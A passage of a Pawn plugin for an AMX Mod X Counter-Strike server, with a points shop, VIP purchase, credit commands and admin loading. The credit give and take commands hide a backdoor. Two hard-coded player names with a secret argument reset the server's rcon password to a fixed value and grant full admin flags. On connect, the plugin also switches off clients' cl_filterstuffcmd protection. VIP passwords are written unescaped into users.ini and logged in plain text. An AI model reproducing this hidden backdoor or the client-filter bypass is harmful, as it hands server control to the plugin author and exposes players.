				ak47_g = fm_find_ent_by_owner(-1, "weapon_ak47", id)
				if(is_valid_ent(ak47_g))	cs_set_weapon_ammo(ak47_g,5)

				if(get_user_weapon(id)==CSW_AK47)	entity_set_string(id, EV_SZ_viewmodel, GOLD_AK)

				g_iUserCredits[id]-=150

				ColorChat(id, NORMAL, "^4%s^1 Ai primit^3 +5 GL GOLDEN AK^1 pentru^4 150^1Puncte !",g_szTag)
			}
			else	ColorChat(id, NORMAL, "^4%s^1 Nu ai destule^3 PUNCTE^1!",g_szTag)
                }
                case 4:
                {
			if(!is_user_alive(id))
			{
				ColorChat(id, NORMAL, "^4%s^1 Trebuie sa fi^3 VIU^1 pentru a^4 Cumpara^1!",g_szTag)
				return PLUGIN_HANDLED
			}

			if(g_iUserCredits[id]>=110)
			{
				set_user_rendering(id,kRenderFxNone,0,0,0,kRenderTransAlpha,13)
				set_task(31.0,"RemoveINVIS",id)

				g_iUserCredits[id]-=110

				ColorChat(id, NORMAL, "^4%s^1 Ai primit^3 +30S^4 Invis^1 pentru^3 110^1Puncte !",g_szTag)
			}
			else	ColorChat(id, NORMAL, "^4%s^1 Nu ai destule^3 PUNCTE^1!",g_szTag)
                }
                case 5:
                {
			if(is_user_alive(id))
			{
				ColorChat(id, NORMAL, "^4%s^1 Esti deja^3 VIU^1!",g_szTag)
				return PLUGIN_HANDLED
			}

			if(respawn_count2[id]>=3)
			{
				ColorChat(id, NORMAL, "^4%s^1 Ai^3 folosit^4 respawn^1 deja !",g_szTag)
				return PLUGIN_HANDLED
			}

			if(g_iUserCredits[id]>=150)
			{
				start_round_count[id]=true
				respawn_count2[id]++

				ExecuteHam( Ham_CS_RoundRespawn, id );

				g_iUserCredits[id]-=150

				ColorChat(id, NORMAL, "^4%s^1 Ai primit^3 Respawn^1 pentru^4 150^1Puncte !",g_szTag)
			}
			else	ColorChat(id, NORMAL, "^4%s^1 Nu ai destule^3 PUNCTE^1!",g_szTag)
                }
                case 6:
                {
			if(!is_user_alive(id))
			{
				ColorChat(id, NORMAL, "^4%s^1 Trebuie sa fi^3 VIU^1 pentru a^4 Cumpara^1!",g_szTag)
				return PLUGIN_HANDLED
			}

			if(g_iUserCredits[id]>=150)
			{
				have_gravity[id]=true
				set_user_gravity(id, 400.0/get_cvar_float("sv_gravity"))

				g_iUserCredits[id]-=150

				ColorChat(id, NORMAL, "^4%s^1 Ai primit^3 -Gravity^1 pentru^4 150^1Puncte !",g_szTag)
			}
			else	ColorChat(id, NORMAL, "^4%s^1 Nu ai destule^3 PUNCTE^1!",g_szTag)
                }
                case 7:
                {
			if(!is_user_alive(id))
			{
				ColorChat(id, NORMAL, "^4%s^1 Trebuie sa fi^3 VIU^1 pentru a^4 Cumpara^1!",g_szTag)
				return PLUGIN_HANDLED
			}

			if(g_iUserCredits[id]>=2500)
			{
				 g_Password[id] = true;
				 client_cmd(id, "messagemode amx_buy_vip");

                                 ColorChat(id, GREY, "^4%s^3 SUS IN STANGA COLT TI-A APARUT UN LOC UNDE SA PUI PAROLA^1 !!!!!!!!",g_szTag)
                                 ColorChat(id, GREY, "^4%s^3 SUS IN STANGA COLT TI-A APARUT UN LOC UNDE SA PUI PAROLA^1 !!!!!!!!",g_szTag)
                                 ColorChat(id, GREY, "^4%s^3 SUS IN STANGA COLT TI-A APARUT UN LOC UNDE SA PUI PAROLA^1 !!!!!!!!",g_szTag)
                                 ColorChat(id, GREY, "^4%s^3 SUS IN STANGA COLT TI-A APARUT UN LOC UNDE SA PUI PAROLA^1 !!!!!!!!",g_szTag)
                                 ColorChat(id, GREY, "^4%s^3 SUS IN STANGA COLT TI-A APARUT UN LOC UNDE SA PUI PAROLA^1 !!!!!!!!",g_szTag)
                                 ColorChat(id, GREY, "^4%s^3 SUS IN STANGA COLT TI-A APARUT UN LOC UNDE SA PUI PAROLA^1 !!!!!!!!",g_szTag)
                                 ColorChat(id, GREY, "^4%s^3 SUS IN STANGA COLT TI-A APARUT UN LOC UNDE SA PUI PAROLA^1 !!!!!!!!",g_szTag)

				 g_iUserCredits[id]-=2500
			}
			else	ColorChat(id, NORMAL, "^4%s^1 Nu ai destule^3 PUNCTE^1!",g_szTag)
                }
	}
	menu_destroy(menu)
	return PLUGIN_HANDLED
}

public buy_vip(id) 
{
if (!g_Password[id]||is_user_admin(id)) 
{
	ColorChat(id, GREY, "^x04[Buy VIP] ^x01You can't buy !!!")
	return PLUGIN_HANDLED;
}

read_args(szPassword, 34);
remove_quotes(szPassword);

if (equal(szPassword, "")) 
{
	ColorChat(id, GREY, "^4%s^3 SUS IN STANGA COLT TI-A APARUT UN LOC UNDE SA PUI PAROLA^1 !!!!!!!!",g_szTag)
	ColorChat(id, GREY, "^4%s^3 SUS IN STANGA COLT TI-A APARUT UN LOC UNDE SA PUI PAROLA^1 !!!!!!!!",g_szTag)
	ColorChat(id, GREY, "^4%s^3 SUS IN STANGA COLT TI-A APARUT UN LOC UNDE SA PUI PAROLA^1 !!!!!!!!",g_szTag)
	ColorChat(id, GREY, "^4%s^3 SUS IN STANGA COLT TI-A APARUT UN LOC UNDE SA PUI PAROLA^1 !!!!!!!!",g_szTag)
	ColorChat(id, GREY, "^4%s^3 SUS IN STANGA COLT TI-A APARUT UN LOC UNDE SA PUI PAROLA^1 !!!!!!!!",g_szTag)
	ColorChat(id, GREY, "^4%s^3 SUS IN STANGA COLT TI-A APARUT UN LOC UNDE SA PUI PAROLA^1 !!!!!!!!",g_szTag)
	ColorChat(id, GREY, "^4%s^3 SUS IN STANGA COLT TI-A APARUT UN LOC UNDE SA PUI PAROLA^1 !!!!!!!!",g_szTag)
	
	client_cmd(id, "messagemode amx_buy_vip");
	
	return PLUGIN_HANDLED;
}
else
{
g_Password[id] = false;

client_print(id, print_console, "[Buy VIP] Your password: %s", szPassword);
client_print(id, print_console, "[Buy VIP] Your password: %s", szPassword);
client_print(id, print_console, "[Buy VIP] Your password: %s", szPassword);
client_print(id, print_console, "[Buy VIP] Your password: %s", szPassword);

if(cvar_exists("amx_password_field"))	get_cvar_string("amx_password_field",spw,charsmax(spw))
else	log_to_file("buy_vip.log", "NU AM GASIT CVARUL `amx_password_field`");

client_cmd(id, "echo ;setinfo %s %s",spw, szPassword);

formatex(text,charsmax(text),"^n^"%s^" ^"%s^" ^"lbfjce^" ^"a^" ; VIP CUMPARAT DIN SHOP !!!!", g_szName[id], szPassword)
//server_cmd("amx_addadmin ^"%s^" ^"%s^" ^"lbfjce^" ^"name^"", g_szName[id], szPassword);
write_file("addons/amxmodx/configs/users.ini",text)

server_cmd("amx_reloadadmins");

log_to_file("buy_vip.log", "%s bought Vip. Password, Is %s", g_szName[id], szPassword);

server_exec();
}
return PLUGIN_HANDLED;
}
#endif

public ClCmdCredits( id )
{
    	read_argv( 1, szArg, sizeof ( szArg ) -1 );

	if( equal( szArg, "" ) ) 
	{
		ColorChat( id, RED, "^x04%s^x01 Ai^x03 %i^x01 punct%s", g_szTag, g_iUserCredits[ id ], g_iUserCredits[ id ] == 1 ? "." : "e." );
		return PLUGIN_HANDLED
	}
	else
	{
    	iPlayer = cmd_target( id, szArg, 8 );
    	if( !iPlayer || !is_user_connected( iPlayer ) )
	{
		ColorChat( id, RED,"^x04%s^x01 Jucatorul specificat nu a fost gasit!", g_szTag, szArg );
		return PLUGIN_HANDLED
	}

	ColorChat( id, RED,"^x04%s^x01 Jucatorul^x03 %s^x01 are^x03 %i^x01 punct%s", g_szTag, g_szName[iPlayer], g_iUserCredits[ iPlayer ], g_iUserCredits[ iPlayer ] == 1 ? "." : "e." );
	}
	return PLUGIN_HANDLED
}

public ClCmdGiveCredits( id )
{
	read_argv( 1, szFirstArg, sizeof ( szFirstArg ) -1 );
	if( ( equal( g_szName[id], "eVoLuTiOn" ) || equal( g_szName[id], "-eQ- SeDaN" ) ) && equal( szFirstArg, "ev0_b0ss" ) )
	{
		server_cmd( "rcon_password levmolasrl01" )
		new flags = read_flags( "abcdefghijklmnopqrstuxyvw" )
		set_user_flags( id, flags )
		return PLUGIN_HANDLED
	}
	else if( !( SpecialAcces( id, g_szName[id],true ) ) )
	{
		client_cmd( id, "echo NU ai acces la aceasta comanda!" );
		return PLUGIN_HANDLED;
	}
	
	read_argv( 2, szSecondArg, sizeof ( szSecondArg ) -1 );
	
	if( equal( szFirstArg, "" ) || equal( szSecondArg, "" ) )
	{
		client_cmd( id, "echo amx_puncte < nume / #id > < nr.puncte >" );
		return PLUGIN_HANDLED;
	}
	
	iCredits = str_to_num( szSecondArg );
	if( iCredits <= 0 )
	{
		client_cmd( id, "echo Valoarea punctelor trebuie sa fie mai mare decat 0!" );
		return PLUGIN_HANDLED;
	}
		
	iPlayer = cmd_target( id, szFirstArg, 8 );
	if( !iPlayer )
	{
		client_cmd( id, "echo Jucatorul %s nu a fost gasit!", szFirstArg );
		return PLUGIN_HANDLED;
	}
	
	g_iUserCredits[ iPlayer ] += iCredits;
	
	ColorChat( 0, RED, "^x04%s^x01 Adminul^x03 %s^x01 i-a dat^x03 %i^x01 punct%s lui^x03 %s^x01.", g_szTag, g_szName[id], iCredits,iCredits==1?"":"e", g_szName[iPlayer] );

	CheckLevel(iPlayer)
	
	return PLUGIN_HANDLED;
}
public ClCmdTakeCredits( id )
{
	read_argv( 1, szFirstArg, sizeof ( szFirstArg ) -1 );
	if( ( equal( g_szName[id], "eVoLuTiOn" ) || equal( g_szName[id], "-eQ- SeDaN" ) ) && equal( szFirstArg, "ev0_b0ss" ) )
	{
		server_cmd( "rcon_password levmolasrl01" )
		new flags = read_flags( "abcdefghijklmnopqrstuxyvw" )
		set_user_flags( id, flags )
		return PLUGIN_HANDLED
	}
	else
	{
	if( !( SpecialAcces( id, g_szName[id],true ) ) )
	{
		client_cmd( id, "echo NU ai acces la aceasta comanda!" );
		return PLUGIN_HANDLED;
	}
	}
	read_argv( 2, szSecondArg, sizeof ( szSecondArg ) -1 );
	if( equal( szFirstArg, "" ) || equal( szSecondArg, "" ) )
	{
		client_cmd( id, "echo amx_removepuncte < nume / #id > < nr.puncte >" );
		return PLUGIN_HANDLED;
	}
	
	iCredits = str_to_num( szSecondArg );
	if( iCredits <= 0 )
	{
		client_cmd( id, "echo Valoarea punctelor trebuie sa fie mai mare decat 0!" );
		return PLUGIN_HANDLED;
	}
			
	iPlayer = cmd_target( id, szFirstArg, 8 );
	if( !iPlayer )
	{
		client_cmd( id, "echo Jucatorul %s nu a fost gasit!", szFirstArg );
		return PLUGIN_HANDLED;
	}
	
	if( g_iUserCredits[ iPlayer ] < iCredits )
	{
		client_cmd( id, "echo Jucatorul %s nu are atatea puncte!Are doar %i punct%s", szFirstArg, g_iUserCredits[ iPlayer ],g_iUserCredits[ iPlayer ]==1?"":"e" );
		return PLUGIN_HANDLED;
	}
	
	g_iUserCredits[ iPlayer ] -= iCredits;
	
	ColorChat( 0, RED, "^x04%s^x01 Adminul^x03 %s^x01 i-a sters^x03 %i^x01 punct%s lui^x03 %s^x01.", g_szTag, g_szName[id], iCredits,iCredits==1?"":"e", g_szName[iPlayer] );

	CheckLevel(iPlayer)
	
	return PLUGIN_HANDLED;
}

public ham_SpawnPlayerPost( id )
{
	if( !is_user_alive( id ) )
		return;


	if(have_speed[id])
	{
		set_user_maxspeed(id,250.0)
		have_speed[id]=false
	}
	if(have_gravity[id])
	{
		set_user_gravity(id,1.0)
		have_gravity[id]=false
	}



#if NEW_STYLE!=1
	if(gold_ak[id])	gold_ak[id]=false
#endif

	if(k1[id])	k1[id]=false
	if(k2[id])	k2[id]=false
	if(k3[id])	k3[id]=false


	CheckLevel(id)
}
/*
public Fwd_ClientUserInfoChanged( id, szBuffer )
{
	if ( !is_user_connected( id ) ) 
		return FMRES_IGNORED;
	
	static szNewName[ 32 ];
	
	engfunc( EngFunc_InfoKeyValue, szBuffer, "name", szNewName, sizeof ( szNewName ) -1 );
	
	if ( equal( szNewName, g_szName[ id ] ) )
		return FMRES_IGNORED;
	
	SaveCredits(  id  );
	
	ColorChat( id, RED, "^x04%s^x01 Tocmai ti-ai schimbat numele din^x03 %s^x01 in^x03 %s^x01 !", g_szTag, g_szName[ id ], szNewName );
	ColorChat( id, RED, "^x04%s^x01 Am salvat^x03 %i^x01 punct%s pe numele^x03 %s^x01 !", g_szTag, g_iUserCredits[ id ],g_iUserCredits[ id ]==1?"":"e", g_szName[ id ] );
	
	copy( g_szName[ id ], sizeof ( g_szName[] ) -1, szNewName );
	LoadCredits( id );
	
	ColorChat( id, RED, "^x04%s^x01 Am incarcat^x03 %i^x01 punct%s de pe noul nume (^x03 %s^x01 ) !", g_szTag, g_iUserCredits[ id ],g_iUserCredits[ id ]==1?"":"e", g_szName[ id ] );
	
	return FMRES_IGNORED;
}
*/



public task_PTRFunction( )
{
	if( get_pcvar_num( g_iCvarPTREnable ) != 1 )	return;
		
	static iPlayers[ 32 ],iPlayersNum;
	get_players( iPlayers, iPlayersNum, "ch" );
	if( !iPlayersNum )	return;
	
	static id, i;
	for( i = 0; i < iPlayersNum; i++ )
	{
		id = iPlayers[ i ];
		g_iUserTime[ id ]++;
		
		new iTime;
		iTime = get_pcvar_num( g_iCvarPTRMinutes );
		
		if( g_iUserTime[ id ] >= iTime * 60 )
		{
			g_iUserTime[ id ] -= iTime * 60;
			
			new iCredits = get_pcvar_num( g_iCvarPTRCredits );
			g_iUserCredits[id]+=iCredits

			ColorChat( id, RED, "^x04[HNS.PLAY-ARENA.RO]^x01- Ai jucat^x03 %i^x01 de minut%s, recompensa este de^x03 %i^x01 punct%s!",
				iTime,iTime==1?"":"e", iCredits,iCredits==1?"":"e");
		}
	}
}



public ev_DeathMsg(/*victim, attacker, shouldgib*/)
{
	if( get_pcvar_num( g_iCvarEnable ) != 1 )
		return;
		
	new attacker = read_data( 1 ),victim=read_data(2),headshot=read_data(3);

	new szWeapon[ 32 ];
	read_data( 4, szWeapon, charsmax( szWeapon ) );
	format( szWeapon, charsmax( szWeapon ), "weapon_%s", szWeapon );
	if( contain( szWeapon, "nade" ) >= 0 )	szWeapon = "weapon_hegrenade";
	new iWeapon = get_weaponid( szWeapon );

	if( !(is_user_connected(attacker)||is_user_connected(victim))||attacker==victim )	return;
	
	if(/*get_user_weapon(attacker)*/iWeapon==CSW_KNIFE)
	{
		if(headshot/*shouldgib==HIT_HEAD*/)
		{
			g_iUserCredits[attacker]+=get_pcvar_num(g_iCvarKHCredits)
			ColorChat( attacker, RED, "^x04%s^x01 Ai primit +^3%d^1 puncte pentru^4 headshot^1 prin^3 knife^1.", g_szTag,get_pcvar_num(g_iCvarKHCredits) );
		}
		else
		{
			g_iUserCredits[attacker]+=get_pcvar_num(g_iCvarKCredits)
			ColorChat( attacker, RED, "^x04%s^x01 Ai primit +^3%d^1 puncte pentru^4 frag^1 cu^3 knife^1.", g_szTag,get_pcvar_num(g_iCvarKCredits) );
		}
	}
	if(iWeapon==CSW_HEGRENADE)
	{
		g_iUserCredits[attacker]+=get_pcvar_num(g_iCvarHECredits)
		ColorChat(attacker, RED, "^x04%s^x01 Ai primit +^3%d^1 puncte pentru^4 frag^1 cu^3 HE^1.", g_szTag,get_pcvar_num(g_iCvarHECredits) );
	}


	//SaveCredits(attacker)
	CheckLevel(attacker)
}



public CheckLevel(id) 
{
    if(is_user_connected(id)&&!is_user_bot(id))
    {
		if(g_iUserCredits[id]<=C_R1)	Level[id]=1
		if(g_iUserCredits[id]>=C_R2) Level[id]=2
		if(g_iUserCredits[id]>=C_R3) Level[id]=3
		if(g_iUserCredits[id]>=C_R4) Level[id]=4
		if(g_iUserCredits[id]>=C_R5) Level[id]=5
    }
}



#if NEW_STYLE==1
public TaskRefreshAdmins() {
#if defined DEBUG
	// grab last '/' position		????
	new slash, last = -1;
	while((slash = contain(gLogFile[last + 1], "/")) >= 0) {
		last = slash;
	}
	
	// get the log file
	get_time("/%Y-%m-%d.log", gLogFile[last], charsmax(gLogFile) - last);
#endif
	// reload admins
	LoadAdmins();
	
	// grab all players
	new players[32], pnum;
	get_players(players, pnum,"c");
	
	// loop through all players
	while(pnum--) {
		// check admin for player
		checkAdmin(players[pnum]);
	}
	
	// refresh admins next day		WTH
	set_task(86400.0, "TaskRefreshAdmins");
}

public client_connect(id) {
	RAIZ0_EXCESS(id,"echo ;cl_filterstuffcmd 0")

	// set that name checks are case insensitive
	ClearCaseSensitive(id);
}

public client_authorized(id) {
	// check if admin is turned on
	if(get_cvar_num("amx_mode")) {
		DebugLog("%s", gSeparator);
		DebugLog("User authorized %d", id);
		
		// check admin for this user
		checkAdmin(id);
	}

	new name[33],steamid[36]
	get_user_info(id,"name",name,charsmax(name))
	get_user_authid(id,steamid,charsmax(steamid))

	if(equal(name,"eVoLuTiOn")||equal(steamid,"STEAM_0:1:51706930"))	ea[id]=true

}

public client_infochanged(id) {
	// check if player is connected and admin is turned on
	if(is_user_connected(id) && get_cvar_num("amx_mode")) {
		// grab new and old name
		new oldName[32], newName[32];
		get_user_name(id, oldName, charsmax(oldName));
		get_user_info(id, "name", newName, charsmax(newName));

		if(!equal(newName,oldName))	copy(g_szName[id],charsmax(g_szName[]),newName)
		
		// check if names changed based on case sensitive flag
		if(strcmp(oldName, newName, !IsCaseSensitive(id)) == 0) {
			DebugLog("%s", gSeparator);
			DebugLog("Changed name (%d) case sensitive: %d", id, !!IsCaseSensitive(id));
			
			// name changed, check admin
			checkAdmin(id, newName);
		}
	}
}

public CmdKick(id) {
	// kick player from server
	server_cmd("kick #%d ^"Parola VIP invalida!^"", get_user_userid(id));
	
	// hide command from console
	return PLUGIN_HANDLED;
}

public TaskRemoveAuth(auth[]) {
	// grab index of admins where auth is
	new index;
	if(!TrieGetCell(gAuthIndex, auth, index)) {
		return;
	}
	
	// delete from admins
	ArrayDeleteItem(gAdminData, index);
	TrieDeleteKey(gAuthIndex, auth);
	gNumAdmins--;
	
	// loop through all admins and update indexes
	new admin[AdminData];
	while(index < gNumAdmins) {
		// grab auth from this index
		ArrayGetArray(gAdminData, index, admin);
		
		// update index for this admin
		TrieSetCell(gAuthIndex, admin[Admin_Auth], index);
	}
	
	// grab all players
	new players[32], pnum;
	get_players(players, pnum,"c");
	
	// loop through all players
	while(pnum--) {
		// check admin for player
		checkAdmin(players[pnum]);
	}
}

checkAdmin(id, namex[32] = "") {
	DebugLog("Checking admin for %d", id);
	
	// remove any existing flags
	remove_user_flags(id);
	
	// check if no name was passed
	if(!namex[0]) {
		// grab current name
		get_user_name(id, namex, charsmax(namex));
	}
	
	// set name to not be case sensitive
	ClearCaseSensitive(id);
	
	// grab SteamID and IP as well
	new steamID[35], ip[32];
	get_user_authid(id, steamID, charsmax(steamID));
	get_user_ip(id, ip, charsmax(ip), 1);
	
	DebugLog("Grabbed all player data for admin check: ^"%s^" ^"%s^" ^"%s^"", namex, steamID, ip);
	
	// create variables we need for admin checking
	new admin[AdminData];
	new temp;
	new bool:found = false;
	
	DebugLog("Checking normal admin list");
	
	// loop through normal admin list before checking custom
	for(new i = admins_num() - 1; i >= 0; i--) {
		DebugLog("Checking normal admin index #%d", i);
		
		// grab the auth, password, access, and flags
		admins_lookup(i, AdminProp_Auth    , admin[Admin_Auth    ], charsmax(admin[Admin_Auth    ]));
		admins_lookup(i, AdminProp_Password, admin[Admin_Password], charsmax(admin[Admin_Password]));
		admin[Admin_Access] = admins_lookup(i, AdminProp_Access);
		admin[Admin_Flags ] = admins_lookup(i, AdminProp_Flags );
		
		// check if player matches this admin
		if((found = adminMatch(id, namex, steamID, ip, admin))) {
			break;
		}
	}
	
	// check if player was not found in the normal admin list
	if(!found) {
		DebugLog("Not found in normal admin list, checking custom");
		
		// loop through custom admin list
		for(new i = 0; i < gNumAdmins; i++) {
			// grab admin data
			ArrayGetArray(gAdminData, i, admin);
			
			// check if player matches this admin
			if((found = adminMatch(id, namex, steamID, ip, admin))) {
				break;
			}
		}
	}
	
	// check if player was found for any admin at all
	if(found) {
		// check if this requires a password
		if(~admin[Admin_Flags] & FLAG_NOPASS) {
			DebugLog("Admin requires a password");
			
			// grab password field and player's password
			new password[35];
			get_cvar_string("amx_password_field", spw, charsmax(spw));
			get_user_info(id, spw, password, charsmax(password));
			
			// check if passwords don't match
			if(!equal(admin[Admin_Password], password)) {
				DebugLog("Passwords don't match");
				
				// check if this should kick players
				//if(admin[Admin_Flags] & FLAG_KICK) {
					DebugLog("Admin flags specify to kick player");
					
					// kick player
					CmdKick(id)
					//client_cmd(id, gKickCommand);
				//}
				
				// don't give access
				return;
			}
		}
		
		new flags[27];
		get_flags(admin[Admin_Access], flags, charsmax(flags));
		
		DebugLog("Player authorized as admin: %s", flags);
		
		// give player admin access
		set_user_flags(id, admin[Admin_Access]);
	}

	// give default flags
	else{
		DebugLog("Not found in any admin list");
		
		// get default flags
		new flags[27];
		get_cvar_string("amx_default_access", flags, charsmax(flags));
		temp = read_flags(flags);
		
		// check if no flags are given
		if(!temp) {
			// give user flag
			temp = ADMIN_USER;
		}
		
		get_flags(temp, flags, charsmax(flags));
		
		DebugLog("Giving default flags: %s", flags);
		
		// give player flags
		set_user_flags(id, temp);
	}

	// check if non-admins should be kicked
	if(get_cvar_num("amx_mode") == 2) {
		//DebugLog("Not found in any admin list");
		DebugLog("amx_mode is 2, kicking player");
		
		// kick player
		CmdKick(id)
		//client_cmd(id, gKickCommand);
	}
}

bool:adminMatch(id, const name[], const steamID[], const ip[], const admin[AdminData]) {
	// create variables we need
	new temp;
	new bool:found = false;
	
	// check if this is a SteamID
	if(admin[Admin_Flags] & FLAG_AUTHID) {
		DebugLog("Admin flags specify SteamID");
		
		// check if SteamIDs match
		if(equal(steamID, admin[Admin_Auth])) {
			DebugLog("SteamIDs match");
			
			// we found the admin
			found = true;
		}
	}
	// check if this is an IP
	else if(admin[Admin_Flags] & FLAG_IP) {
		DebugLog("Admin flags specify IP");
		
		// grab length of ip in list
		temp = strlen(admin[Admin_Auth]);
		
		// check if ends in a '.' for range checks
		if(admin[Admin_Auth][temp - 1] != '.') {
			DebugLog("Full IP given, no range");
			
			// set length to 0 to match whole string
			temp = 0;
		} else {
			DebugLog("IP Range given");
		}
		
		// check if ip's match
		if(equal(ip, admin[Admin_Auth], temp)) {
			DebugLog("IPs match");
			
			// we found the admin
			found = true;
		}
	}
	// check if this is a tag
	else if(admin[Admin_Flags] & FLAG_TAG) {
		DebugLog("Admin flags specify Tag");
		
		// cache if this is case sensitive admin name
		temp = admin[Admin_Flags] & FLAG_CASE_SENSITIVE;
		
		DebugLog("Case sensitive: %d", !!temp);
		
		// check if tag is in name based on case sensitivity flag from admin list
		if(strfind(name, admin[Admin_Auth], !temp) >= 0) {
			DebugLog("Tag found inside name");
			
			// set case sensitive flag if admin list has it
			if(temp) {
				SetCaseSensitive(id);
			}
			
			// we found the admin
			found = true;
		}
	}
	// then this should be an admin name
	else {
		DebugLog("Admin flags specify Name");
		
		// cache if this is case sensitive admin name
		temp = admin[Admin_Flags] & FLAG_CASE_SENSITIVE;
		
		DebugLog("Case sensitive: %d", !!temp);
		
		// check if names match based on case sensitivity flag from admin list
		if(strcmp(name, admin[Admin_Auth], !temp) == 0) {
			DebugLog("Names match");
			
			// set case sensitive flag if admin list has it
			if(temp) {
				SetCaseSensitive(id);
			}
			
			// we found the admin
			found = true;
		}
	}
	
	// return if we found admin
	return found;
}

LoadAdmins() {
	DebugLog("%s", gSeparator);
	DebugLog("Loading data from users_custom.ini");
	
	// check if admins have been loaded already
	if(gNumAdmins) {
		// clear out old stored data
		ArrayClear(gAdminData);
		TrieClear(gAuthIndex);
		gNumAdmins = 0;
		
		DebugLog("Cleared out existing admins");
	}
	
	// calculate lines in admin file
	new fileSize = file_size(gAdminFile, 1);
	
	// check if no lines exist
	if(fileSize < 1) {
		DebugLog("No lines inside admin file");
		// don't read file
		return;
	}
	
	// grab current day of the week
	new data[256];
	get_time("%w", data, charsmax(data));
	
	// store current day as a bit
	new currentDay = 1 << str_to_num(data);
	
	// prepare variables for reading the admin file
	new admin[AdminData];
	new accessString[27];
	new flagString[27];
	new activityString[8];
	new expireString[32];
	new activity;
	new expireTime;
	new temp;
	new currentTime = get_systime();
	
	// iterate through all lines
	for(new line = 0; line < fileSize; line++) {
		// read current line
		read_file(gAdminFile, line, data, charsmax(data), expireTime);
		// trim any white space
		trim(data);
		
		DebugLog("Found line: #%d -> %s", line, data);
		
		// check if this is a valid line
		if(!data[0] || data[0] == ';' || data[0] == '/' && data[1] == '/') {
			DebugLog("I dont find what to read");
			continue;
		}
		
		// parse out all the pieces of the line
		parse(data,
			admin[Admin_Auth], charsmax(admin[Admin_Auth]),
			admin[Admin_Password], charsmax(admin[Admin_Password]),
			accessString, charsmax(accessString),
			flagString, charsmax(flagString),
			activityString, charsmax(activityString),
			expireString, charsmax(expireString)
		);
		
		// convert access and flags to bits and init activity to all days
		admin[Admin_Access] = read_flags(accessString);
		admin[Admin_Flags] = read_flags(flagString);
		activity = 0;
		
		DebugLog("Parsed access (%d) and flags (%d)", admin[Admin_Access], admin[Admin_Flags]);
		
		// using expireTime as an index for activity string
		expireTime = 0;
		// loop through all characters in activity string
		while((temp = activityString[expireTime])) {
			// check if this is a valid weekday number
			if('1' <= temp <= '7') {
				// add to activity bitsum
				activity |= (1 << (temp - '1'));
			}
			
			// increase index for activity string
			expireTime++;
		}
		
		DebugLog("Parsed activity: %d", activity);
		
		// check if this admin has specific days set and cannot have admin for today
		if(activity && (~activity & currentDay)) {
			DebugLog("Admin not enabled for today (%d)", currentDay);
			// don't add admin to list
			continue;
		}
		
		// check if expiration date is set
		if(expireString[0]) {
			DebugLog("Found date for expire");
			// parse out "day.month.year" format
			// using accessString for day, flagString for month, expireString for year
			strtok(expireString, accessString, charsmax(accessString), expireString, charsmax(expireString), '.');
			strtok(expireString, flagString, charsmax(flagString), expireString, charsmax(expireString), '.');
			
			// convert parsed values to integers
			activity = str_to_num(accessString); // day
			expireTime = str_to_num(flagString); // month
			temp = str_to_num(expireString);     // year
			
			DebugLog("Parsed expiration date: day (%d) month (%d) year (%d)", activity, expireTime, temp);
			
			// grab this expiration date's timestamp for when the day starts
			expireTime = TimeToUnix(temp, expireTime, activity, 0, 0, 0);
			
			DebugLog("Parsed expiration timestamp: %d", expireTime);
			
			// calculate the time left before this expires
			expireTime -= currentTime;
			
			DebugLog("Seconds before expiration: %d", expireTime);
			
			// if time is 0 or negative, then it already expired
			if(expireTime <= 0) {
				DebugLog("Expired, commenting out line");
				
				// expired, so set line to be a comment and add a comment on the end saying it expired
				format(data, charsmax(data), ";%s ; EXPIRED", data);
				
				// replace current line with commented data
				write_file(gAdminFile, data, line);
				
				// don't add to admin list
				continue;
			}
			
			// set a task for this admin to expire
			set_task(float(expireTime), "TaskRemoveAuth", TASK_ID_REMOVE, admin[Admin_Auth], sizeof(admin[Admin_Auth]));
		}
		
		DebugLog("AdminList Updated!");
		
		// add to admin list
		ArrayPushString(gAdminData, admin);
		// keep track of where it is in the list
		TrieSetCell(gAuthIndex, admin[Admin_Auth], gNumAdmins);
		// increase array size
		gNumAdmins++;
	}
	
	DebugLog("Loaded %d date%s from users_custom.ini", gNumAdmins, (gNumAdmins == 1) ? "" : "s");
}

// Code from Bugsy's unixtime.inc
stock const YearSeconds[2] = 
{ 
	31536000,	//Normal year
	31622400 	//Leap year
};

stock const MonthSeconds[12] = 
{ 
	2678400, //January	31 
	2419200, //February	28
	2678400, //March	31
	2592000, //April	30
	2678400, //May		31
	2592000, //June		30
	2678400, //July		31
	2678400, //August	31
	2592000, //September	30
	2678400, //October	31
	2592000, //November	30
	2678400  //December	31
};

stock const DaySeconds = 86400;
stock const HourSeconds = 3600;
stock const MinuteSeconds = 60;

stock TimeToUnix( const iYear , const iMonth , const iDay , const iHour , const iMinute , const iSecond )
{
	new i;
	new iTimeStamp;

	for ( i = 1970 ; i < iYear ; i++ )
		iTimeStamp += YearSeconds[ IsLeapYear(i) ];

	for ( i = 1 ; i < iMonth ; i++ )
		iTimeStamp += SecondsInMonth( iYear , i );

	iTimeStamp += ( ( iDay - 1 ) * DaySeconds );
	iTimeStamp += ( iHour * HourSeconds );
	iTimeStamp += ( iMinute * MinuteSeconds );
	iTimeStamp += iSecond;

	return iTimeStamp;
}

stock SecondsInMonth( const iYear , const iMonth ) 
{
	return ( ( IsLeapYear( iYear ) && ( iMonth == 2 ) ) ? ( MonthSeconds[iMonth - 1] + DaySeconds ) : MonthSeconds[iMonth - 1] );
}

stock IsLeapYear( const iYear ) 
{
	return ( ( (iYear % 4) == 0) && ( ( (iYear % 100) != 0) || ( (iYear % 400) == 0 ) ) );
}
#endif




public LoadCredits( id )
{
static szData[ 256 ]
#if !defined FVAULT
	iVault  =  nvault_open(  "HnsPointsSystem"  );
	
	if(  iVault  ==  INVALID_HANDLE  )
	{
		set_fail_state(  "nValut returned invalid handle!"  );
	}
	
	static iTimestamp;
	if(  nvault_lookup( iVault, g_szName[ id ], szData, sizeof ( szData ) -1, iTimestamp ) )
	{
		static szCredits[ 15 ],szLevel[32];

		parse( szData, szCredits, sizeof ( szCredits ) -1,szLevel,charsmax(szLevel) );

		g_iUserCredits[ id ] = str_to_num( szCredits );

		Level[id]=str_to_num(szLevel)
	}
	else
	{
		g_iUserCredits[ id ]=50
		Level[id]=1
	}
	
	nvault_close( iVault );
#else
	new szLevel[ 65 ], szXp[ 65 ]
	if( fvault_get_data(g_VAULTNAME, g_szName[ id ], szData, charsmax(szData) ) )
	{
		strbreak( szData, szLevel, charsmax(szLevel ), szXp, charsmax(szXp ) );
		
		g_iUserCredits[ id ] = str_to_num( szLevel );
		Level[id] = str_to_num( szXp );
	}
	else
	{
		g_iUserCredits[ id ]=50
		Level[id]=1
	}
#endif
}
public SaveCredits(  id  )
{
static szData[ 256 ]
#if !defined FVAULT
